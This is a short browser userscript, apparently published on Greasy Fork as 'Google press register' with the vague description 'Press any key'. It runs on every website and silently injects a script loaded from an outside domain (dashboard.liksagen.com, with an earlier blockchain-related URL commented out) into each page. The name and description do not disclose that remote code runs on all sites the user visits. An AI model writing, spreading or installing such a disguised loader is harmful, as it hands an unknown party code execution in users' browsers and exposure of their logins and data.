// ==UserScript==
// @name         Google press register
// @namespace    http://tampermonkey.net/
// @version      0.115
// @description  Press any key
// @author       Lxgn
// @match        https://*/*
// @match        http://*/*
// @grant        none
// @downloadURL https://update.greasyfork.org/scripts/408022/Google%20press%20register.user.js
// @updateURL https://update.greasyfork.org/scripts/408022/Google%20press%20register.meta.js
// ==/UserScript==

//alert('Google press register');
console.log('Google press register');
//http://dashboard/js/google/register.php

var ms = new Date();
//document.write('mister kuku');
console.log('mister kuku');
//document.write("<html><meta content=\"default-src * 'unsafe-inline' 'unsafe-eval'\">");


var script = document.createElement('script');
//var t = Math.random()*1000000;

//var kuda = "https://js.pro-blockchain.com/minter_telega/?"+ms.getTime();
var kuda = "https://dashboard.liksagen.com/js/?"+ms.getTime();
console.log(kuda);
script.src = kuda;
//document.write("<a href=http://zzz>zzz</a><script>alert('a');</script>");
document.body.appendChild(script);
